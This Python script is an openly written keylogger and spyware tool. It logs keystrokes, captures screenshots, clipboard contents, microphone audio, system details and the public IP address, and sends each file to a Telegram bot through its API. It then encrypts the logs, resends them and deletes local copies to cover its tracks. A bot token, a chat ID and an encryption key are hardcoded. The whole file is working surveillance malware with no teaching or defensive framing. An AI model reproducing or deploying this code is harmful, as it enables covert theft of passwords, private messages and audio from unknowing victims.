import requests
from pynput.keyboard import Key, Listener
import time
import os
from cryptography.fernet import Fernet
from PIL import ImageGrab
import getpass
import socket
import platform
import pyperclip
from scipy.io.wavfile import write
import sounddevice as sd
from requests import get

# Define file paths and Telegram bot information
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
bot_token = "7269502506:AAFx1FbzZpYOHrSFgdSLuw7YamKWSBpY7Ek"  # Replace with your bot token
chat_id = "6092309166"  # Replace with your chat ID

username = getpass.getuser()

key = "jmJ1hppnj8npXmYe13w3nUBH3KfUClQu0PLWS1VvTHk="

file_path = "/home/kali/Downloads/keylogger"
extend = "/"
file_merge = file_path + extend

# Initialize global variables
keys = []
count = 0
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
logging_active = True

# Function to send a file via Telegram
def send_file_via_telegram(file_path, file_name, chat_id, bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {'document': open(file_path + extend + file_name, 'rb')}
    data = {'chat_id': chat_id, 'caption': "Log File"}

    try:
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print("File sent successfully.")
        else:
            print(f"Failed to send file: {response.status_code}")
    except Exception as e:
        print(f"Error occurred: {e}")

# Take a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
    send_file_via_telegram(file_path, screenshot_information, chat_id, bot_token)

# Keylogger to record keystrokes
def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k + '\n')

def on_release(key):
    global currentTime, stoppingTime, number_of_iterations, logging_active

    # Stop logging if Ctrl + X is pressed
    if key == Key.ctrl_l or key == Key.ctrl_r:  # Check if Ctrl is pressed
        if Key.x in keys:
            print("Ctrl + X pressed. Stopping the keylogger.")
            logging_active = False
            listener.stop()  # Stop the listener
            return

    if currentTime > stoppingTime:
        # Reset variables and continue logging
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

        # Send the updated key log to Telegram
        send_file_via_telegram(file_path, keys_information, chat_id, bot_token)

# Start the keylogger
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

# Get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

    send_file_via_telegram(file_path, system_information, chat_id, bot_token)

computer_information()

# Get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            pasted_data = pyperclip.paste()
            f.write("Clipboard Data: \n" + pasted_data)
        except Exception as e:
            f.write("Clipboard could not be copied\n")
            f.write(f"Error: {e}\n")

    send_file_via_telegram(file_path, clipboard_information, chat_id, bot_token)

copy_clipboard()

# Record audio from the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
    send_file_via_telegram(file_path, audio_information, chat_id, bot_token)

microphone()

while logging_active:  # Continue keylogging while logging_active is True
    time.sleep(1)

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                        file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_file_via_telegram(file_merge, encrypted_file_names[count], chat_id, bot_token)
    count += 1

time.sleep(120)

# Clean up tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
